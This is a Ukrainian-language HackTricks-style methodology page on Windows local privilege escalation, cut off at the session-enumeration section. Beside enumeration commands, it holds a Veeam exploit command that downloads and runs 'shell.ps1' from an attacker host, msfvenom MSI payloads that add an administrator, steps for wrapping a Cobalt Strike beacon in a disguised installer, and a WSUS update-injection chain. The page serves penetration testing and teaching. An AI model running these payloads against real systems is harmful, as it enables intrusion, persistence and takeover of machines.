# Локальне підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію підвищення привілеїв у Windows із кількох фундаментальних посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний процес переліку даних також спирається на спільнотні воркшопи й контрольні списки.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичний матеріал про атаки включає презентацію DerbyCon про підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

## Основи Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, перш ніж продовжити, прочитайте цю сторінку:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Докладніше про ACL — DACL/SACL/ACE — читайте на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, перш ніж продовжити, прочитайте цю сторінку:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби безпеки Windows

У Windows є різні механізми, які можуть **перешкодити вам збирати дані про систему**, запускати виконувані файли або навіть **виявляти вашу діяльність**. Перш ніж починати збір даних для підвищення привілеїв, слід **прочитати** цю **сторінку** й **перевірити** всі ці **захисні механізми**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити редагування UEFI NVRAM в автономному режимі на DMA до завантаження системи й ланцюжок модифікації пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Захист адміністратора / приховане підвищення привілеїв UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо обійти перевірки безпечного шляху AppInfo. Дивіться спеціальний процес обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру доступності Secure Desktop можна використати для довільного запису в реєстр від імені SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з’явився вектор LPE через **довільний порт SMB**, за якого привілейована локальна автентифікація NTLM відбивається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Перелік відомостей про версію

Перевірте, чи є відомі вразливості у вашій версії Windows (також перевірте встановлені оновлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти за версіями

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості безпеки Microsoft. У цій базі даних є понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та потенційно відповідні бюлетені безпеки; перш ніж вважати результат застосовним, перевірте точний продукт і оновлення, що замінюють попередні.

Для локального експлойту, залежного від версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай відповідає 32-бітному системному каталогу, тоді як `%windir%\Sysnative` надає цьому процесу доступ до нативного системного каталогу. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або підозра на відсутнє оновлення KB не доводять, що систему можна експлуатувати; порівняйте поточну збірку, встановлене оновлення або оновлення, що його замінює, архітектуру процесу та передумови експлойту з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032), що стосується саме цієї проблеми.

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на GitHub:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережені в змінних середовища облікові дані або інша цінна інформація?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли транскриптів PowerShell

Дізнатися, як увімкнути це, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай записує файли в папку Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити файли до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях збереження та ACL файлу: він може містити аргументи команд і вивід, зокрема облікові дані. Транскрипт, доступний для читання, є лише зачіпкою, якщо його вміст розкриває придатну для використання ідентичність із вищими привілеями, а ця ідентичність може ввійти в систему у відповідному контексті.

### Журналювання модулів PowerShell

Записуються відомості про виконання конвеєрів PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повна інформація про виконання та результати виводу можуть не записуватися.

Щоб увімкнути цю функцію, дотримуйтеся вказівок у розділі документації «Transcript files», вибравши **«Module Logging»** замість **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowerShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повний журнал активності та вмісту під час виконання скрипту, що гарантує документування кожного блоку коду в процесі його виконання. Це забезпечує вичерпний аудиторський слід кожної дії, цінний для криміналістичного аналізу та дослідження шкідливої поведінки. Документування всіх дій під час виконання дає змогу отримати детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Події журналювання Script Block можна знайти у Windows Event Viewer за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, скористайтеся:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Параметри Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP-ендпойнт WSUS — це підстава перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політики клієнта щодо довіри до оновлень та їх встановлення. Сам URL не підтверджує можливість виконання коду. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спершу перевірте, чи використовує мережа для оновлень WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або таке в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримали відповідь, схожу на одну з таких:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Коли `UseWUServer` має значення `1`, Windows Update використовує налаштовану внутрішню службу. Це підтверджує передумову для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення або встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, цей конкретний налаштований кінцевий вузол WSUS не вибирається цією політикою.

Щоб експлуатувати ці вразливості, можна використовувати такі інструменти, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це озброєні MiTM exploit-скрипти для впровадження «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Ознайомтеся з дослідженням тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця вразливість використовує такий недолік:

> Якщо ми можемо змінити проксі-сервер локального користувача, а Windows Updates використовує проксі, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), перехопити власний трафік і виконати код із підвищеними привілеями на нашому ресурсі.
>
> Крім того, оскільки служба WSUS використовує параметри поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо створити самопідписаний сертифікат для імені хоста WSUS і додати його до сховища сертифікатів поточного користувача, можна буде перехоплювати HTTP- і HTTPS-трафік WSUS. WSUS не використовує механізми на кшталт HSTS для реалізації перевірки сертифіката за принципом trust-on-first-use. Якщо сертифікат, який надається, довірений користувачем і має правильне ім’я хоста, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (щойно його оприлюднять).

### Оновлення WSUS, керовані адміністратором

Окремий шлях існує, коли поточна особа може **публікувати й схвалювати** оновлення на сервері WSUS. Перевірте ефективне членство в групі сервера `WSUS Administrators` і будь-які делеговані дозволи WSUS, а потім визначте групу комп’ютерів-клієнтів, якій буде надано схвалене оновлення. [Microsoft вимагає привілеїв адміністратора WSUS для схвалення оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [описує довірчий зв’язок для публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом ескалації привілеїв, переконайтеся, що кандидатне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Саме по собі значення HTTP `WUServer` або назва групи цих умов не підтверджує.

### Зловживання користувацькими оновленнями SUSDB: непідписані payload-и через `.txt`/`.esd`

Це інше порушення межі довіри, ніж перехоплення HTTP-з’єднання WSUS: необхідною передумовою є достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)** для публікації та схвалення користувацького оновлення. Один із практичних способів отримати такий доступ — relay облікового запису комп’ютера upstream-сервера WSUS на окремий сервер MSSQL, де розміщено `SUSDB`; точні передумови залежать від розгортання, тож спершу перевірте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, який relay-ить автентифікацію клієнта WSUS з HTTP/8530 до LDAP, SMB або AD CS, описано в розділі [Зловживання HTTP WSUS для NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Створення, вибір цілі та схвалення оновлення

Процес роботи з користувацькими оновленнями використовує легітимні процедури WSUS як обмежений API для публікації. Важливі такі переходи станів:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження фрагментів XML із передумовами, локалізацією та розширеними даними | `spSaveXMLFragment` |
| Прив’язування digest вмісту до контрольованого зловмисником URL | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Схвалення встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Назва файла, digest-и, розмір і обробник `CommandLineInstallation` мають збігатися в імпортованих метаданих і фрагментах. Після призначення URL вмісту та цільової групи фінальне схвалення має такий вигляд; використовуйте нові ідентифікатори оновлення, групи та розгортання, а не повторно використовуйте наведені GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Обхід перевірки підпису на основі розширення

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката у значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; тоді `CheckCertificateSignature` пропускається без попередньої перевірки, що байти є текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt` може пройти перевірку вмісту, а згодом бути запущеним обробником встановлення оновлення з командного рядка. Це помилка плутанини політики й типів, а не підроблення підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-сумісне розміщення й автоматизація

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Сервер-джерело має відповідати вимогам BITS до HTTP: доступного URL недостатньо, оскільки передавання використовує початковий обмін `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє подію синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, потрібний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для розміщення вмісту. Мінімальний запуск в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без нагляду та persistence через повторні спроби

Взаємодія на стороні клієнта залежить від політики. Параметр `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, опція `4 - Auto download and schedule install`, забезпечує завантаження та встановлення схваленого оновлення за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишалося в стані помилки/незавершеного виконання, одразу знову пропонувався після завершення процесу callback, тому поведінка повторних спроб може забезпечувати recurring execution persistence; це помітно, оскільки клієнт показує стан помилки оновлення.<sup>[[39]](#references)</sup>

#### Напрями виявлення та посилення захисту

Корисні напрями перевірки на сервері й клієнті для цього ланцюжка:<sup>[[39]](#references)</sup>

- Проведіть аудит виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; перевіряйте нові групи цільового розгортання, зовнішні джерела контенту, payload оновлень `.txt`/`.esd` і розгортання, виконані неочікуваними principals (особливо обліковими записами, що не є обліковими записами комп’ютерів).
- Перегляньте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте результати перевірки з розширенням payload і сигнатурою вмісту, а не довіряйте суфіксу.
- Шукайте випадки, коли встановлення Windows Update постійно завершується помилкою/повторюється, а також виконання PE або неочікувану дочірню/мережеву активність із контенту, що має назви з `.txt` або `.esd`.
- Якщо підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте та перевіряйте права `EXECUTE` на процедурах custom-update.

## Сторонні автооновлювачі та IPC агентів (локальне підвищення привілеїв)

Багато корпоративних агентів надають IPC-інтерфейс на localhost і привілейований канал оновлення. Якщо реєстрацію можна спрямувати на сервер зловмисника, а автооновлювач довіряє підробленому root CA або має слабкі перевірки підписувача, локальний користувач може доставити шкідливий MSI, який встановить служба SYSTEM. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Veeam Backup & Replication і Cloud Connect використовують основну службу резервного копіювання, яка за замовчуванням працює через **TCP/9401**. [Рекомендації Veeam](https://www.veeam.com/kb4424) описують неавтентифіковане розкриття зашифрованих облікових даних бази даних конфігурації в межах мережевого периметра резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тож перевірте фактичну адресу та PID.

- **Розвідка**: підтвердьте, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані патчів. `netstat -ano | findstr 9401` та `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` — це підказки, а не повна перевірка наявності патчів.
- **Мінімальні виправлені версії**: Veeam вказує **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені випуски; попередні випуски вразливі. За самою чотирикомпонентною версією файла неможливо відрізнити невиправлену базову збірку від пізнішого патча для тих самих номерів збірки. Перш ніж вважати граничну збірку виправленою, перевірте ідентифікатор патча за [історією збірок виробника](https://www.veeam.com/kb2680).
- **Експлуатація**: помістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL Veeam в один каталог, а потім запустіть payload із правами SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

У цитованому PoC показано виконання команд від імені SYSTEM за наявності додаткових передумов; у рекомендаціях виробника описано проблему розкриття облікових даних.
## KrbRelayUp

Локальний Kerberos relay може забезпечити перехід від входу з нижчими привілеями до привілейованого запису в каталозі, якщо відповідний COM-сервер проходить автентифікацію, а ретрансльований принципал має права на цільовий об’єкт. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) операції запису в LDAP для RBCD і `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих сценаріїв. Для ланцюжка RBCD потрібні відповідні права делегування та права на цільовий об’єкт, а для ланцюжка shadow-credential — права на запис ключових облікових даних і KDC, що підтримує шлях автентифікації за сертифікатом. Самого членства в домені недостатньо для жодного з цих сценаріїв.

Перевірте політики фактичного DC щодо [підписування LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [прив’язки каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL об’єкта для ретрансльованого ідентифікатора, а також рівні автентифікації та уособлення вибраного класу COM. Тип входу користувача та контекст облікових даних мають значення: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. Маршрутизація через брандмауер/OXID та встановлені оновлення також можуть вплинути на результат. Розглядайте дозвільну політику або відповідний ACL як привід для перевірки; пасивне перерахування не повинно запускати примусове залучення COM, relay-автентифікацію чи запис у каталог. Shadow credential облікового запису комп’ютера може призвести до отримання квитка комп’ютера і, лише якщо цей обліковий запис має необхідні права реплікації каталогу, до окремого шляху DCSync.

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, дивіться [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 ключі реєстру **увімкнені** (значення — **0x1**), користувачі з будь-яким рівнем привілеїв можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сеанс meterpreter, цю техніку можна автоматизувати за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт створює попередньо скомпільований інсталятор MSI, який запитує додавання користувача/групи (тому вам знадобиться доступ до GUI):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зверніть увагу: можна обгорнути файл «**.bat**», якщо потрібно **лише** **виконувати** **командні рядки**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- **Згенеруйте** за допомогою Cobalt Strike або Metasploit новий **Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть «installer» у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Укажіть назву проєкту, наприклад **AlwaysPrivesc**, виберіть розташування **`C:\privesc`**, позначте **place solution and project in the same directory** і натисніть **Create**.
- Натискайте **Next**, доки не перейдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно створений Beacon payload. Потім натисніть **Finish**.
- Виберіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в **Properties** змініть **TargetPlatform** з **x86** на **x64**.
  - Також можна змінити інші властивості, наприклад **Author** і **Manufacturer**, щоб встановлена програма виглядала легітимніше.
- Клацніть проєкт правою кнопкою миші й виберіть **View > Custom Actions**.
- Клацніть **Install** правою кнопкою миші й виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це гарантує, що Beacon payload запуститься одразу після запуску інсталятора.
- У розділі **Custom Action Properties** встановіть для **Run64Bit** значення **True**.
- Нарешті, **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що для платформи встановлено значення x64.

### Встановлення MSI

Щоб виконати **встановлення** шкідливого файлу `.msi` **у фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та засоби виявлення

### Налаштування аудиту

Ці налаштування визначають, що **реєструється в журналах**, тож на них слід звернути увагу.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — цікаво знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначено для **керування паролями локальних облікових записів Administrator**: воно забезпечує, щоб на комп’ютерах, приєднаних до домену, кожен пароль був **унікальним, випадковим і регулярно оновлювався**. Ці паролі безпечно зберігаються в Active Directory, і доступ до них мають лише користувачі з достатніми дозволами через ACL, що дає їм змогу переглядати паролі локальних адміністраторів за наявності відповідних прав.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо WDigest активний, **паролі зберігаються в LSASS у відкритому тексті** (Local Security Authority Subsystem Service).\
[**Докладніше про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про захист LSA тут**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, що зберігаються на пристрої, від таких загроз, як атаки pass-the-hash. [**Докладнішу інформацію про Credential Guard можна знайти тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Облікові дані домену** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для користувача зазвичай створюються облікові дані домену.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелік користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **входите до привілейованої групи, можливо, ви зможете підвищити привілеї**. Дізнайтеся більше про привілейовані групи та про те, як зловживати ними для підвищення привілеїв:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Токени Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте цю сторінку, щоб **дізнатися про цікаві токени** та про те, як зловживати ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Авторизовані користувачі / Сеанси

```bash
qwinsta
